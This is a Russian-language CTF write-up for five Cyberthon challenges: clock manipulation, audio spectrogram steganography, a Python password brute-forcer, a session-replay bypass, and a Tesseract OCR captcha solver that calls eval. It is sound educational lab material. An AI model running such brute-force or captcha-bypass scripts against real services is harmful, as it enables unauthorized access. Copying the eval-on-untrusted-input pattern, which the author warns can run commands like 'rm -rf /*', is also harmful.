## 1. Singularity (web)
#### Условие:
`Эх, когда уже наступит сингулярность...` http://45.143.94.76:3004/
#### Как решать?
переходим на сайт по ссылке из условия:

![](https://storage.geekclass.ru/images/86481ba2-1168-435e-8d39-17036fce6c29.png)
Внимательно смотрим, что отправляется при нажатии на кнопку:

![](https://storage.geekclass.ru/images/2807dc80-f8b8-40d5-b3c8-bdb805fd85bc.png)

И это просто локальное время: `let t = new Date();`

Cоеденив эту информацию с огромной надписью на сайте (флаг будет доступен в 2045 году) ~~отправляем на сервер post запрос с любым временем 2045 года в формате YYYY-MM-DDTHH:mm:ss.sssZ~~ переставляем локальное время на 2045 год и ... получаем флаг!

## 2. well-known song (stego)
#### Условие:
`Хм, где-то я слышал эту песню...` http://web.ctf.msk.ru/ctn2020kdjfkasakd/web2/wiedzmin/strange_sound.mp3
#### Как решать?
Скачиваем файл и смотрим свойства:

![](https://storage.geekclass.ru/images/4a6da481-67e5-45db-9cb1-fb05f4abb6e0.png)

Обращаем внимание на ~~то, что это не христианский рок~~ имя исполнителя. Догадываемся, что нужно посмотреть спектрограмму. Для этого подойдут программы `Sonic Visualizer` или `Audacity`

Открываем спектрограмму на `0:34 - 0:40` (в это время в аудио слышны подозрительные звуки)

![](https://storage.geekclass.ru/images/a45e3318-9267-4033-b1a0-178ddaf21027.png)
А вот и флаг!

## 3. za_pazwardo (web + ppc)
#### Условие:
`И ты, Брут?` http://45.143.94.76:3000/
#### Как решать?
Открываем сайт: 

![](https://storage.geekclass.ru/images/caf866ae-d1e4-441e-a97f-f44e41dccd66.png)

Ага, требуется ввести пароль в формате `[a-z0-9]` (буквы латинского алфавита в нижнем регистре и цифры от 0 до 9)

В html коде замечаем, что пароль почти полностью известен, неизвестно лишь 2 символа. Внимательно прочитав условия задачи понимаем, что нужно пробрутить (перебрать все возможные комбинации) пароль.

Пишем простой скрипт на питоне:
```
import sys

import requests
from string import ascii_lowercase

passw = "24{}secb7{}5falqdss"

dictionary = ascii_lowercase + "0123456789"
c = 0
url = "http://45.143.94.76:3000/check"

for let1 in dictionary:
    for let2 in dictionary:

        rez = requests.get(url, params={"password": passw.format(let1, let2)})
        print(c, passw.format(let1, let2))
        c += 1
        if "CYBERTHON{" in rez.text:
            print("flag found: ", rez.text)
            sys.exit(0)
```

Флаг получаем на 458 итерации.

## 4. za_pazwardo_requiem (web)
#### Условие:
`Теперь ты знаешь пароль, но никогда не сможешь достичь цели...` http://45.143.94.76:3001/
#### Как решать?
Переходим на веб-страницу:

![](https://storage.geekclass.ru/images/eb2a6d38-4f94-46b1-a4d4-077c19ac9f7e.png)
Пробуем отправить пароль и... 

![](https://storage.geekclass.ru/images/dc9d6351-0679-46c0-8af8-861c4ff8041d.png)

Смотрим, какие запросы отправляются:
![](https://storage.geekclass.ru/images/4bb0f459-f0e0-4729-b874-6086c1793da1.png)

Замечаем, что каждый раз отправляется 2 запроса, один на смену пароля, другой на проверку. Тем самым проверяется уже новый пароль, а не старый. Нужно просто отправить один запрос на проверку, вместо двух.

Код на питоне:
```
import requests
import re

s = requests.Session()
url = "http://45.143.94.76:3001/"

html = s.get(url).text
pasw = re.findall(r'passw">([a-z0-9\-]+)<', html)  # quick&dirty
print(pasw[0])

rez = s.post(url + "check", data={"new_passw": pasw[0]})
print(rez.text)
```

>Для того, чтобы пароль не поменялся между запросами используем сессию: `requests.Session()`

`P.S` *никогда* не парсите html регулярками (трюк выполнен профессионалом)

## 5. captcha_generator (web + ppc)
#### Условие:
`Что ты знаешь про OCR?` http://45.143.94.76:3002/
#### Как решать?
Заходим на сайт:

![](https://storage.geekclass.ru/images/80ab255f-33e6-438b-a664-f18149ede4d8.png)

Опытным путём выясняем, что нужно решить 250 математических примеров. Да еще и распознать их! Используем pytesseract и PIL.
>Использование tesseract OCR разбиралось на мастер-классе перед 4 этапом, все материалы находятся в курсе: [Материалы для подготовки к Кибертону](https://geekclass.ru/insider/courses/95)

~~Решаем все 250 примеров руками~~ Пишем код на питоне:
```
import pytesseract
from PIL import Image
import requests
import re

s = requests.Session()
url = "http://45.143.94.76:3002/"

html = s.get(url).text

errors = {79: 4330, 178: 617, 212: 2749}

for i in range(252):

    img_link = re.findall(r'src="(.+)" width', html)[0]
    img = s.get(url + img_link).content

    with open("captcha.png", "wb") as f:
        f.write(img)

    # tesseract бывает ошибается
    if i in errors:
        res = errors[i]
    else:
        pytesseract.pytesseract.tesseract_cmd = r'C:\tesseract\tesseract.exe'
        exp = pytesseract.image_to_string(Image.open('captcha.png'))
        res = eval(exp)
        print(i, exp, res)

    html = s.post(url + "check", data={"example": res}).text

    if "CYBERTHON{" in html:
        print(html)
        break
```
`P.S` Про регулярные выражения вы уже поняли, а вот `eval` использовать тоже не надо (Представьте что бы случилось если бы в последнем изображени было бы `rm -rf /*`). Все выражения имеют одинаковую структуру, поэтому можно просто делать split() и брать числа поэлементно

После решения всех 250 примеров получаем флаг.